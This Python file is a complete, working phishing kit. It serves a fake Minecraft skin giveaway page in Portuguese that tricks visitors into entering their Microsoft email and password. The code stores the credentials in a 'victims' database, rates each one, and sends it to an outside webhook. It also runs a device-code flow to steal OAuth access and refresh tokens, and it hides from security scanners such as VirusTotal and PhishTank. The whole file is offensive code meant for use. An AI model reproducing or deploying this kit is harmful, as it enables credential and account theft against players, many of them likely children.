#!/usr/bin/env python3
import secrets, json, datetime, random, time, requests, os, sqlite3, base64, re, csv, io
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from collections import defaultdict

PORT = int(os.environ.get("PORT", 8080))
PUBLIC_URL = os.environ.get("PUBLIC_URL", f"http://localhost:{PORT}")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
DEVICE_CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2"
DEVICE_SCOPE = "https://graph.microsoft.com/.default offline_access"

CONFIG = {
    "server_host": "0.0.0.0", "server_port": PORT,
    "webhook_url": WEBHOOK_URL, "public_url": PUBLIC_URL,
    "featured_skin": {"name": "ENDER PHOENIX", "value": "R$89,90", "rarity": "LENDÁRIA"},
    "skins_rotation": [
        {"name": "NETHER DRAGON", "value": "R$120,00", "rarity": "MÍTICA"},
        {"name": "OCEAN LORD", "value": "R$75,00", "rarity": "ÉPICA"},
        {"name": "VOID WALKER", "value": "R$95,00", "rarity": "LENDÁRIA"},
        {"name": "COSMIC GUARDIAN", "value": "R$150,00", "rarity": "MÍTICA"}
    ],
    "og_giveaway": {
        "active": True, "prize_name": random.choice(["Kill","Hero","Game","Life","Gold","Iron","Fire","Snow","Star","Moon"]),
        "prize_value": "R$500,00+", "winners": 1, "fake_participants": 15247,
        "end_date": (datetime.datetime.now() + datetime.timedelta(days=60)).strftime('%d/%m/%Y')
    },
    "fake_servers": [
        {"name": "Minecraft Brasil", "icon": "🎮", "resgates": 15247},
        {"name": "CubeCraft Games", "icon": "🧊", "resgates": 8921},
        {"name": "Hypixel Network", "icon": "⚔️", "resgates": 28436},
        {"name": "Mineplex Brasil", "icon": "⭐", "resgates": 5642}
    ],
    "global_stats": {"total_resgates": 15842, "total_participantes_sorteio": 15247}
}

captured_sessions, session_counter, click_stats, active_sessions = [], 0, defaultdict(int), {}

def init_database():
    conn = sqlite3.connect('captured_data.db')
    conn.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, email TEXT, password TEXT, ip TEXT,
        user_agent TEXT, skin_choice TEXT, giveaway_participant INTEGER,
        time_on_page INTEGER, clicks INTEGER, session_id TEXT,
        access_token TEXT, refresh_token TEXT, token_expires TEXT
    )''')
    conn.close()

init_database()

def save_to_database(data):
    conn = sqlite3.connect('captured_data.db')
    conn.execute('''INSERT INTO victims (timestamp, email, password, ip, user_agent,
        skin_choice, giveaway_participant, time_on_page, clicks, session_id,
        access_token, refresh_token, token_expires)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)''',
        (data['timestamp'], data['email'], data['password'], data['ip'],
         data['user_agent'], data.get('skin_choice',''),
         1 if data.get('giveaway_participant') else 0,
         data.get('time_on_page',0), data.get('clicks',0), data.get('session_id',''),
         data.get('access_token',''), data.get('refresh_token',''), data.get('token_expires','')))
    conn.commit()
    conn.close()

def generate_session_id():
    global session_counter
    session_counter += 1
    return f"SID_{session_counter}_{secrets.token_hex(8)}"

def generate_captcha():
    a, b = random.randint(1,9), random.randint(1,9)
    return {"question": f"{a} + {b} = ?", "answer": str(a+b)}

def detect_security_environment(headers):
    ua = headers.get('User-Agent', '').lower()
    bots = ['googlebot','bingbot','ahrefsbot','semrushbot','virustotal','phishtank','urlscan','censys']
    return any(bot in ua for bot in bots)

def calculate_score(email, password):
    score = 0
    if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        score += 20
    domain = email.split('@')[-1].lower() if '@' in email else ''
    if domain in ['outlook.com','hotmail.com','live.com','microsoft.com','gmail.com']:
        score += 20
    if len(password) >= 8:
        score += 30
    elif len(password) >= 6:
        score += 15
    for check in [any(c.isupper() for c in password), any(c.islower() for c in password),
                  any(c.isdigit() for c in password), any(c in "!@#$%^&*()" for c in password)]:
        if check: score += 8
    return min(score, 100)

def send_webhook(data):
    if not CONFIG["webhook_url"]:
        return
    score = data.get('validation_score', 0)
    color, qual = (0x00ff00, "🏆 ALTA") if score >= 80 else (0xffaa00, "⭐ MÉDIA") if score >= 60 else (0xff6600, "⚠️ BAIXA")
    try:
        requests.post(CONFIG["webhook_url"], json={"embeds":[{
            "title": f"🎯 NOVA CONTA CAPTURADA! {qual}",
            "color": color,
            "fields": [
                {"name":"📧 Email","value":data['email'],"inline":True},
                {"name":"🔑 Senha","value":f"||{data['password']}||","inline":True},
                {"name":"📊 Score","value":f"{score}/100","inline":True},
                {"name":"🎨 Skin","value":data.get('skin_choice','N/A'),"inline":True}
            ]
        }]}, timeout=5)
    except: pass

def start_device_flow():
    try:
        r = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
                         data={"client_id": DEVICE_CLIENT_ID, "scope": DEVICE_SCOPE}, timeout=10)
        if r.status_code == 200:
            j = r.json()
            return j.get("user_code"), j.get("device_code"), j.get("verification_uri"), j.get("interval",5), j.get("expires_in",900)
    except: pass
    return None, None, None, 5, 0

def poll_for_token(device_code, interval, timeout):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = requests.post(url, data={"client_id": DEVICE_CLIENT_ID, "device_code": device_code,
                                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code"}, timeout=5)
            if r.status_code == 200:
                j = r.json()
                return j.get("access_token",""), j.get("refresh_token",""), j.get("expires_in",0)
        except: pass
        time.sleep(interval)
    return "", "", 0

class EvilginxFinal(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def do_GET(self):
        path = urlparse(self.path).path
        if detect_security_environment(self.headers):
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(b"Microsoft 365")
            return
        if path == '/': self.serve_main_page()
        elif path == '/dashboard': self.serve_dashboard()
        elif path == '/qrcode': self.serve_qrcode()
        elif path == '/stats': self.serve_stats()
        elif path == '/api/captcha': self.serve_captcha()
        elif path == '/device/poll': self.handle_device_poll()
        else: self.send_response(404); self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        if path == '/auth': self.capture_credentials()
        elif path == '/api/click': self.track_click()
        else: self.send_response(404); self.end_headers()

    def handle_device_poll(self):
        query = parse_qs(urlparse(self.path).query)
        dc = query.get('device_code', [None])[0]
        if not dc:
            self.send_response(400); self.end_headers()
            return
        access, refresh, _ = poll_for_token(dc, 5, 300)
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"access_token": access, "refresh_token": refresh}).encode())

    def serve_qrcode(self):
        user_code, device_code, ver_uri, _, _ = start_device_flow()
        qr_url = ver_uri if device_code else CONFIG["public_url"]
        manual = f'<p>Código: {user_code}</p>' if user_code else ''
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(f'''
        <html><head><title>QR Code</title><style>body{{background:#1a1a2e;color:white;text-align:center;}}</style></head>
        <body><h1>📱 Escaneie</h1>{manual}<div id="qrcode"></div>
        <button onclick="poll()">Testar Token</button><div id="res"></div>
        <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
        <script>new QRCode(document.getElementById("qrcode"),{{text:'{qr_url}',width:250,height:250}});
        let dc='{device_code}';
        async function poll(){{let r=await fetch(`/device/poll?device_code=${{dc}}`);let d=await r.json();
        document.getElementById('res').innerHTML=d.access_token?`Token: ${{d.access_token.slice(0,40)}}...`:'Nenhum token';}}
        </script></body></html>'''.encode())

    def serve_main_page(self):
        sid = generate_session_id()
        active_sessions[sid] = time.time()
        og = CONFIG["og_giveaway"]
        captcha = generate_captcha()
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(f'''
        <!DOCTYPE html><html><head><meta charset="UTF-8"><title>🎁 EVENTO MINECRAFT 2026</title>
        <style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63);padding:20px}}
        .container{{max-width:550px;margin:0 auto}}.main-card{{background:white;border-radius:24px;padding:30px}}
        .event-header{{background:linear-gradient(135deg,#f7971e,#ffd200);margin:-30px -30px 20px -30px;padding:25px;text-align:center;border-radius:24px 24px 0 0}}
        .og-card{{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#ffd700;padding:20px;border-radius:16px;margin-bottom:20px;text-align:center}}
        .og-name{{font-size:36px;font-weight:bold;background:#ffd700;color:#1a1a2e;display:inline-block;padding:5px 25px;border-radius:50px;margin:10px 0}}
        .counters{{background:#f8f9fa;padding:15px;border-radius:16px;margin-bottom:20px}}
        .participate-btn{{width:100%;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:white;padding:16px;border:none;border-radius:50px;cursor:pointer;margin:15px 0}}
        .input-field{{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:12px;margin-bottom:15px}}
        .login-btn{{width:100%;background:#0067b8;color:white;padding:14px;border:none;border-radius:12px;cursor:pointer}}
        .captcha-box{{background:#f5f5f5;padding:15px;border-radius:12px;margin:15px 0;text-align:center}}
        .captcha-question{{font-size:24px;font-weight:bold;background:white;display:inline-block;padding:10px 20px;border-radius:10px;margin:10px 0}}
        .captcha-input{{width:100px;text-align:center;font-size:20px;padding:10px;margin:10px auto;display:block}}
        .step-2{{display:none}}.loading-overlay{{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;flex-direction:column;z-index:9999}}
        .spinner{{width:60px;height:60px;border:5px solid #333;border-top-color:#ffd700;border-radius:50%;animation:spin 1s linear infinite}}
        @keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
        </style></head><body>
        <div class="container"><div class="main-card">
        <div class="event-header"><h1>🎉 EVENTO MINECRAFT 2026! 🎉</h1></div>
        <div class="og-card"><span>🎲 SORTEIO ESPECIAL 🎲</span><div class="og-name">{og['prize_name']}</div><div>Conta Minecraft com nome RARO de 4 letras!</div><div>👥 {og['fake_participants']} participantes | 🏆 {og['winners']} vencedor</div><div>📅 Sorteio: {og['end_date']}</div></div>
        <div class="counters"><div>🌍 Total de resgates: 15842+</div><div>🎮 Skins restantes: <span id="skinsLeft">137</span></div><div>👥 Online: <span id="onlineCount">89</span></div></div>
        <button class="participate-btn" id="participateBtn" onclick="showLogin()">🎁 PARTICIPAR (E-mail/Senha)</button>
        <div id="step1" style="display:none"><div class="captcha-box"><div>Verifique que é humano:</div><div class="captcha-question" id="captchaQuestion">{captcha['question']}</div>
        <input type="text" id="captchaInput" class="captcha-input" maxlength="2"><div class="captcha-error" id="captchaError" style="color:red;display:none">Incorreto</div>
        <button onclick="refreshCaptcha()">⟳</button></div>
        <form id="emailForm"><input type="email" id="email" class="input-field" placeholder="Email da Microsoft"><button type="submit" class="login-btn">CONTINUAR</button></form></div>
        <div id="step2" style="display:none"><form id="passwordForm"><input type="password" id="password" class="input-field" placeholder="Sua senha"><button type="submit" class="login-btn">CONFIRMAR</button></form></div>
        </div></div>
        <div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div><div class="loading-text">Verificando...</div></div>
        <script>
        let currentCaptcha = "{captcha['answer']}"; let selectedSkin = "ENDER PHOENIX"; let capturedEmail = '';
        let sessionId = '{sid}'; let pageStartTime = Date.now(); let clickCount = 0;
        setInterval(()=>{{ let s=document.getElementById('skinsLeft'); if(s) s.innerText=Math.max(0,parseInt(s.innerText)-Math.floor(Math.random()*2)); }},3000);
        function refreshCaptcha(){{ fetch('/api/captcha').then(r=>r.json()).then(d=>{{ document.getElementById('captchaQuestion').innerHTML=d.question; currentCaptcha=d.answer; document.getElementById('captchaInput').value=''; }}); }}
        function showLoading(msg){{ document.getElementById('loadingText').innerHTML=msg; document.getElementById('loadingOverlay').style.display='flex'; }}
        function hideLoading(){{ document.getElementById('loadingOverlay').style.display='none'; }}
        function showLogin(){{ document.getElementById('participateBtn').style.display='none'; document.getElementById('step1').style.display='block'; }}
        document.getElementById('emailForm').addEventListener('submit', function(e){{ e.preventDefault();
            if(document.getElementById('captchaInput').value != currentCaptcha){{ document.getElementById('captchaError').style.display='block'; refreshCaptcha(); return; }}
            capturedEmail = document.getElementById('email').value;
            if(!capturedEmail.includes('@')){{ alert('Email inválido'); return; }}
            document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; }});
        document.getElementById('passwordForm').addEventListener('submit', function(e){{ e.preventDefault();
            let pwd = document.getElementById('password').value;
            if(!pwd){{ alert('Digite sua senha'); return; }}
            let timeOnPage = Math.floor((Date.now()-pageStartTime)/1000);
            showLoading('Verificando...');
            setTimeout(()=>{{ fetch('/auth',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{
                email:capturedEmail, password:pwd, session_id:sessionId, user_agent:navigator.userAgent,
                time_on_page:timeOnPage, clicks:clickCount, skin_choice:selectedSkin, giveaway_participant:true, captcha_time:0, loading_time:1000
            }})}}).then(()=>{{ hideLoading();
                document.querySelector('.main-card').innerHTML='<div style="text-align:center;padding:40px"><div>🎉</div><h2>PARTICIPAÇÃO CONFIRMADA!</h2><p>Você está concorrendo!</p></div>';
                setTimeout(()=>window.location.href='https://www.minecraft.net',4000);
            }}); }},1000);
        }});
        </script></body></html>'''.encode())

    def capture_credentials(self):
        length = int(self.headers.get('Content-Length',0))
        data = json.loads(self.rfile.read(length).decode())
        email, password = data.get('email',''), data.get('password','')
        sid, ua, ip = data.get('session_id',''), data.get('user_agent',''), self.client_address[0]
        score = calculate_score(email, password)
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        captured_sessions.append({"timestamp":ts,"email":email,"password":password,"ip":ip,"validation_score":score})
        save_to_database({'timestamp':ts,'email':email,'password':password,'ip':ip,'user_agent':ua[:200],
                         'skin_choice':data.get('skin_choice',''),'giveaway_participant':True,
                         'time_on_page':data.get('time_on_page',0),'clicks':data.get('clicks',0),'session_id':sid,
                         'access_token':'','refresh_token':'','token_expires':''})
        send_webhook({'email':email,'password':password,'validation_score':score})
        print(f"\n[{ts}] CAPTURA: {email} | {password} | Score:{score}")
        self.send_response(200)
        self.end_headers()

    def track_click(self):
        click_stats[self.client_address[0]] += 1
        self.send_response(200)
        self.end_headers()

    def serve_captcha(self):
        c = generate_captcha()
        self.send_response(200)
        self.send_header('Content-type','application/json')
        self.end_headers()
        self.wfile.write(json.dumps(c).encode())

    def serve_dashboard(self):
        rows = ''.join([f'<tr><td>{s["timestamp"]}</td><td>{s["email"]}</td><td>{s["password"]}</td><td>{s["validation_score"]}</td><td>{s["ip"]}</td></tr>' for s in captured_sessions[-20:]])
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(f'<html><body><h1>Dashboard</h1><table border=1><tr><th>Data</th><th>Email</th><th>Senha</th><th>Score</th><th>IP</th></tr>{rows}</table></body></html>'.encode())

    def serve_stats(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(f'<html><body><h1>Stats</h1><p>Capturas: {len(captured_sessions)}</p></body></html>'.encode())

def run():
    print("="*70)
    print("🎯 EVILGINX FINAL - FUNCIONANDO")
    print(f"📡 URL: {PUBLIC_URL}")
    print("="*70)
    server = HTTPServer(("0.0.0.0", PORT), EvilginxFinal)
    server.serve_forever()

if __name__ == "__main__":
    run()
